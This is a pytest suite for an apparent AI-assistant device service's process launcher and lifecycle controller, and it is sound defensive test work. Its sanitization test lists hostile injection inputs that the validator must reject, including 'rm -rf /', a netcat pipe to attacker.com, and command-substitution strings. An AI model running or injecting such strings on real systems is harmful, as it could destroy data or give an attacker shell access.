"""Comprehensive Automated Test Suite for Phase 8: Universal Local Application Launcher & Process Lifecycle Controller.

Validates:
1. Target Input Sanitization & Security Barriers:
   - Command injection character rejection (`;`, `&`, `|`, `$`, `\n`, `\0`).
   - Directory traversal rejection (`..`).
2. Protected Critical System Process Shield:
   - Zero termination of PID 0 / PID 4 / System / csrss / init processes.
   - Honest security denial with clear diagnostic error messages.
3. Executable & URI Resolution:
   - System PATH resolution for binaries.
   - Rejection of invalid paths.
4. Real OS Process Launching (Zero Simulation):
   - Real subprocess creation without shell=True.
   - PID acquisition and verification against psutil.
5. Process Telemetry & Hierarchy Inspection:
   - List running processes with CPU%, memory RSS/VMS in MB.
   - Get detailed process telemetry (cmdline, num_threads, open files, cwd, children).
6. Graceful & Forceful Process Termination:
   - Graceful SIGTERM with timeout wait.
   - Forceful SIGKILL / TerminateProcess fallback.
   - Handling of already dead processes without crashing.
7. Child Process Tree Termination:
   - Clean recursive termination of parent and child process trees.
8. Process Restart Lifecycle:
   - Terminating active process, waiting for exit, and relaunching with arguments.
9. Window Focus Activation:
   - Focus execution via native OS mechanisms.
10. Central DeviceService Lifecycle Integration:
    - Service launch_app, terminate_app, focus_app, restart_app, list_processes, get_process_details.
    - Audit logging and state updates.
11. Central ToolRegistry Dynamic Tool Execution:
    - Execution of device_app_launch, device_app_terminate, device_process_list, device_process_details.
12. FastAPI REST Router Lifecycle Endpoints:
    - Endpoints under /api/v1/devices/...
13. Standalone RoxyDeviceDaemon Dispatch:
    - app_launch, app_terminate, process_list, process_details command handling.
"""

from __future__ import annotations

import os
import shutil
import sys
import time

import psutil
import pytest
from httpx import ASGITransport, AsyncClient

from app.auth.dependencies import get_current_user
from app.auth.models import User
from app.device.daemon import RoxyDeviceDaemon
from app.device.process_controller import ProcessLifecycleController
from app.device.service import DeviceService
from app.main import app
from app.tools.registry import ToolRegistry
from app.tools.schemas import (
    ToolExecutionRequest,
    ToolExecutionStatus,
)

# -----------------------------------------------------------------------------
# Fixtures
# -----------------------------------------------------------------------------

@pytest.fixture
def mock_user() -> User:
    """Mock authenticated user."""
    return User(
        id="user_phase8_test",
        email="lifecycle@roxy.internal",
    )


# -----------------------------------------------------------------------------
# 1. Target Input Sanitization & Security Barriers
# -----------------------------------------------------------------------------

def test_process_controller_target_sanitization() -> None:
    """Verify command injection characters and directory traversal are strictly blocked."""
    # Empty
    with pytest.raises(ValueError, match="cannot be empty"):
        ProcessLifecycleController.sanitize_command_target("")

    with pytest.raises(ValueError, match="cannot be empty"):
        ProcessLifecycleController.sanitize_command_target("   ")

    # Command injection characters
    dangerous_targets = [
        "notepad.exe; calc.exe",
        "app && rm -rf /",
        "app | nc attacker.com 4444",
        "app `whoami`",
        "app $(whoami)",
        "app > output.txt",
        "app\nmalicious_cmd",
        "app\0evil",
    ]
    for bad_target in dangerous_targets:
        with pytest.raises(ValueError, match="Dangerous characters detected"):
            ProcessLifecycleController.sanitize_command_target(bad_target)

    # Directory traversal
    with pytest.raises(ValueError, match="Directory traversal detected"):
        ProcessLifecycleController.sanitize_command_target("../../../malicious_exec")


# -----------------------------------------------------------------------------
# 2. Protected Critical System Process Shield
# -----------------------------------------------------------------------------

def test_process_controller_critical_system_process_shield() -> None:
    """Verify PID <= 4 and critical system processes cannot be terminated."""
    # PID 0 (System Idle) or PID 4 (System)
    for protected_pid in (0, 4):
        res = ProcessLifecycleController.terminate(protected_pid, force=True)
        assert res.success is False
        assert "critical operating system process" in (res.error or "").lower()

    # Process by name check
    for crit_name in ("system", "csrss.exe", "init", "systemd"):
        res = ProcessLifecycleController.terminate(crit_name, force=True)
        # Either not found or blocked by shield
        if not res.already_dead:
            assert res.success is False
            assert "critical operating system process" in (res.error or "").lower()


# -----------------------------------------------------------------------------
# 3. Executable & URI Resolution
# -----------------------------------------------------------------------------

def test_process_controller_resolve_executable() -> None:
    """Verify executable resolution on host system."""
    py_bin = ProcessLifecycleController.resolve_executable("python")
    assert py_bin is not None
    assert os.path.exists(py_bin)

    # Non-existent
    bad_bin = ProcessLifecycleController.resolve_executable("non_existent_binary_999999_xyz")
    assert bad_bin is None


# -----------------------------------------------------------------------------
# 4. Real OS Process Launching (Zero Simulation)
# -----------------------------------------------------------------------------

def test_process_controller_real_launch_and_telemetry() -> None:
    """Launch a real Python process and verify PID via psutil."""
    py_bin = shutil.which("python") or sys.executable
    res = ProcessLifecycleController.launch(
        target=py_bin,
        arguments=["-c", "import time; time.sleep(15)"],
    )

    try:
        assert res.success is True
        assert res.pid is not None
        assert res.pid > 0
        assert psutil.pid_exists(res.pid)
        assert res.duration_ms >= 0
    finally:
        # Cleanup
        if res.pid and psutil.pid_exists(res.pid):
            ProcessLifecycleController.terminate(res.pid, force=True)


# -----------------------------------------------------------------------------
# 5. Process Telemetry & Hierarchy Inspection
# -----------------------------------------------------------------------------

def test_process_controller_list_and_details() -> None:
    """Verify list_processes and get_process_details retrieve real OS telemetry."""
    py_bin = shutil.which("python") or sys.executable
    launch_res = ProcessLifecycleController.launch(
        target=py_bin,
        arguments=["-c", "import time; time.sleep(15)"],
    )
    assert launch_res.success is True
    pid = launch_res.pid
    assert pid is not None

    try:
        # 1. list_processes
        procs = ProcessLifecycleController.list_processes(filter_name="python", limit=50)
        assert len(procs) > 0
        p_match = next((p for p in procs if p.pid == pid), None)
        assert p_match is not None
        assert "python" in p_match.name.lower()
        assert p_match.memory_rss_mb >= 0.0

        # 2. get_process_details
        details = ProcessLifecycleController.get_process_details(pid)
        assert details is not None
        assert details.pid == pid
        assert details.num_threads >= 1
        assert isinstance(details.cmdline, list)
        assert details.memory_rss_mb >= 0.0
        assert details.status in ("running", "sleeping", "unknown")

    finally:
        ProcessLifecycleController.terminate(pid, force=True)


# -----------------------------------------------------------------------------
# 6. Graceful & Forceful Process Termination
# -----------------------------------------------------------------------------

def test_process_controller_termination() -> None:
    """Verify graceful termination and handling of dead processes."""
    py_bin = shutil.which("python") or sys.executable
    res = ProcessLifecycleController.launch(
        target=py_bin,
        arguments=["-c", "import time; time.sleep(15)"],
    )
    assert res.success is True
    pid = res.pid
    assert pid is not None

    # Terminate
    term_res = ProcessLifecycleController.terminate(pid, force=False, timeout_sec=3.0)
    assert term_res.success is True
    assert pid in term_res.terminated_pids
    assert not psutil.pid_exists(pid)

    # Terminating already dead process returns already_dead=True
    dead_res = ProcessLifecycleController.terminate(pid)
    assert dead_res.success is True
    assert dead_res.already_dead is True


# -----------------------------------------------------------------------------
# 7. Child Process Tree Termination
# -----------------------------------------------------------------------------

def test_process_controller_child_tree_termination() -> None:
    """Verify terminate_children recursively kills parent and child processes."""
    py_bin = shutil.which("python") or sys.executable
    # Spawn parent that spawns child
    cmd = (
        "import subprocess, sys, time; "
        "child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)']); "
        "time.sleep(30)"
    )
    parent_res = ProcessLifecycleController.launch(target=py_bin, arguments=["-c", cmd])
    assert parent_res.success is True
    parent_pid = parent_res.pid
    assert parent_pid is not None

    # Wait for child to spawn (poll up to 3 seconds)
    children: list[int] = []
    for _ in range(30):
        try:
            if psutil.pid_exists(parent_pid):
                p = psutil.Process(parent_pid)
                children = [c.pid for c in p.children(recursive=True)]
                if children:
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
        time.sleep(0.1)

    assert len(children) >= 1, f"Child process failed to spawn under parent PID {parent_pid}"

    try:
        # Terminate parent with children
        term_res = ProcessLifecycleController.terminate(
            target=parent_pid,
            force=True,
            terminate_children=True,
        )
        assert term_res.success is True
        assert not psutil.pid_exists(parent_pid)

        # Verify children are dead
        for child_pid in children:
            assert not psutil.pid_exists(child_pid)
    finally:
        # Guarantee cleanup
        if psutil.pid_exists(parent_pid):
            ProcessLifecycleController.terminate(parent_pid, force=True)
        for child_pid in children:
            if psutil.pid_exists(child_pid):
                ProcessLifecycleController.terminate(child_pid, force=True)


# -----------------------------------------------------------------------------
# 8. Process Restart Lifecycle
# -----------------------------------------------------------------------------

def test_process_controller_restart() -> None:
    """Verify restart terminates existing process and relaunches new instance."""
    py_bin = shutil.which("python") or sys.executable
    res = ProcessLifecycleController.launch(
        target=py_bin,
        arguments=["-c", "import time; time.sleep(15)"],
    )
    assert res.success is True
    orig_pid = res.pid
    assert orig_pid is not None

    restart_res = None
    try:
        restart_res = ProcessLifecycleController.restart(
            target=orig_pid,
            arguments=["-c", "import time; time.sleep(15)"],
            wait_timeout_sec=3.0,
        )
        assert restart_res.success is True
        assert restart_res.pid is not None
        assert restart_res.pid != orig_pid
        assert not psutil.pid_exists(orig_pid)
        assert psutil.pid_exists(restart_res.pid)
    finally:
        if restart_res and restart_res.pid and psutil.pid_exists(restart_res.pid):
            ProcessLifecycleController.terminate(restart_res.pid, force=True)


# -----------------------------------------------------------------------------
# 9. Window Focus Activation
# -----------------------------------------------------------------------------

def test_process_controller_focus() -> None:
    """Verify focus attempts window activation without crash or simulation."""
    # Test with non-existent process / window returns False honestly
    focused = ProcessLifecycleController.focus("NonExistent_Ghost_Window_99999")
    assert isinstance(focused, bool)


# -----------------------------------------------------------------------------
# 10. Central DeviceService Lifecycle Integration
# -----------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_device_service_lifecycle_integration(mock_user: User) -> None:
    """Verify launch_app, terminate_app, focus_app, list_processes in DeviceService."""
    service = DeviceService.get_instance()
    dev = await service.get_or_create_local_device(mock_user.id)

    py_bin = shutil.which("python") or sys.executable

    # 1. Launch
    launch_res = await service.launch_app(
        user_id=mock_user.id,
        device_id=dev["id"],
        app_name_or_path=py_bin,
        arguments=["-c", "import time; time.sleep(15)"],
    )
    assert launch_res["success"] is True
    pid = launch_res["pid"]
    assert pid is not None

    try:
        # 2. List processes
        procs = await service.list_processes(
            user_id=mock_user.id,
            device_id=dev["id"],
            filter_name="python",
        )
        assert len(procs) > 0

        # 3. Process details
        details = await service.get_process_details(
            user_id=mock_user.id,
            device_id=dev["id"],
            pid=pid,
        )
        assert details is not None
        assert details["pid"] == pid

        # 4. Focus
        focus_res = await service.focus_app(
            user_id=mock_user.id,
            device_id=dev["id"],
            app_name=py_bin,
        )
        assert "focused" in focus_res

    finally:
        # 5. Terminate
        term_res = await service.terminate_app(
            user_id=mock_user.id,
            device_id=dev["id"],
            app_name_or_pid=pid,
            force=True,
        )
        assert term_res["success"] is True


# -----------------------------------------------------------------------------
# 11. Central ToolRegistry Dynamic Tool Execution
# -----------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_tool_registry_lifecycle_tools(mock_user: User) -> None:
    """Verify ToolRegistry execution of device_app_launch, terminate, and process_list."""
    registry = ToolRegistry.get_instance()
    py_bin = shutil.which("python") or sys.executable

    # 1. Launch tool
    launch_req = ToolExecutionRequest(
        tool_id="device_app_launch",
        arguments={
            "target": py_bin,
            "arguments": ["-c", "import time; time.sleep(15)"],
        },
        user_id=mock_user.id,
        bypass_confirmation=True,
    )
    launch_result = await registry.execute(launch_req)
    assert launch_result.status == ToolExecutionStatus.COMPLETED
    assert launch_result.output["success"] is True
    pid = launch_result.output["pid"]
    assert pid is not None

    try:
        # 2. Process list tool
        list_req = ToolExecutionRequest(
            tool_id="device_process_list",
            arguments={"filter_name": "python", "limit": 10},
            user_id=mock_user.id,
        )
        list_result = await registry.execute(list_req)
        assert list_result.status == ToolExecutionStatus.COMPLETED
        assert list_result.output["total_processes"] > 0

        # 3. Process details tool
        details_req = ToolExecutionRequest(
            tool_id="device_process_details",
            arguments={"pid": pid},
            user_id=mock_user.id,
        )
        details_result = await registry.execute(details_req)
        assert details_result.status == ToolExecutionStatus.COMPLETED
        assert details_result.output["details"]["pid"] == pid

    finally:
        # 4. Terminate tool (with confirmation bypass)
        term_req = ToolExecutionRequest(
            tool_id="device_app_terminate",
            arguments={"target": str(pid), "force": True},
            user_id=mock_user.id,
            bypass_confirmation=True,
        )
        term_result = await registry.execute(term_req)
        assert term_result.status == ToolExecutionStatus.COMPLETED
        assert term_result.output["success"] is True


# -----------------------------------------------------------------------------
# 12. FastAPI REST Router Lifecycle Endpoints
# -----------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_process_lifecycle_api_router() -> None:
    """Verify REST API endpoints for process launch, terminate, list, and details."""
    app.dependency_overrides[get_current_user] = lambda: User(
        id="user_api_lifecycle_test",
        email="lifecycle_api@roxy.internal",
    )

    py_bin = shutil.which("python") or sys.executable
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Launch endpoint
        launch_resp = await client.post(
            "/api/v1/devices/local/apps/launch",
            json={
                "target": py_bin,
                "arguments": ["-c", "import time; time.sleep(15)"],
            },
        )
        assert launch_resp.status_code == 200
        launch_data = launch_resp.json()
        assert launch_data["success"] is True
        pid = launch_data["pid"]
        assert pid is not None

        try:
            # 2. List processes endpoint
            list_resp = await client.get("/api/v1/devices/local/processes?filter_name=python&limit=10")
            assert list_resp.status_code == 200
            procs = list_resp.json()
            assert isinstance(procs, list)
            assert len(procs) > 0

            # 3. Process details endpoint
            details_resp = await client.get(f"/api/v1/devices/local/processes/{pid}")
            assert details_resp.status_code == 200
            details_data = details_resp.json()
            assert details_data["pid"] == pid

        finally:
            # 4. Terminate endpoint
            term_resp = await client.post(
                "/api/v1/devices/local/apps/terminate",
                json={"target": str(pid), "force": True},
            )
            assert term_resp.status_code == 200
            term_data = term_resp.json()
            assert term_data["success"] is True

    app.dependency_overrides.clear()


# -----------------------------------------------------------------------------
# 13. Standalone RoxyDeviceDaemon Dispatch
# -----------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_daemon_process_lifecycle_dispatch() -> None:
    """Verify daemon executes app_launch, app_terminate, and process_list commands."""
    daemon = RoxyDeviceDaemon(
        backend_url="http://127.0.0.1:8000",
        device_id="test_daemon_phase8",
    )
    py_bin = shutil.which("python") or sys.executable

    # 1. Command: app_launch
    status_launch, payload_launch, err_launch = await daemon.execute_command({
        "command_type": "app_launch",
        "payload": {
            "target": py_bin,
            "arguments": ["-c", "import time; time.sleep(15)"],
        },
    })
    assert status_launch == "completed"
    assert payload_launch is not None
    assert payload_launch["success"] is True
    pid = payload_launch["pid"]
    assert pid is not None
    assert err_launch is None

    try:
        # 2. Command: process_list
        status_list, payload_list, err_list = await daemon.execute_command({
            "command_type": "process_list",
            "payload": {"filter_name": "python", "limit": 10},
        })
        assert status_list == "completed"
        assert payload_list is not None
        assert payload_list["total"] > 0
        assert err_list is None

        # 3. Command: process_details
        status_det, payload_det, err_det = await daemon.execute_command({
            "command_type": "process_details",
            "payload": {"pid": pid},
        })
        assert status_det == "completed"
        assert payload_det is not None
        assert payload_det["pid"] == pid
        assert err_det is None

    finally:
        # 4. Command: app_terminate
        status_term, payload_term, err_term = await daemon.execute_command({
            "command_type": "app_terminate",
            "payload": {"target": str(pid), "force": True},
        })
        assert status_term == "completed"
        assert payload_term is not None
        assert payload_term["success"] is True
        assert err_term is None
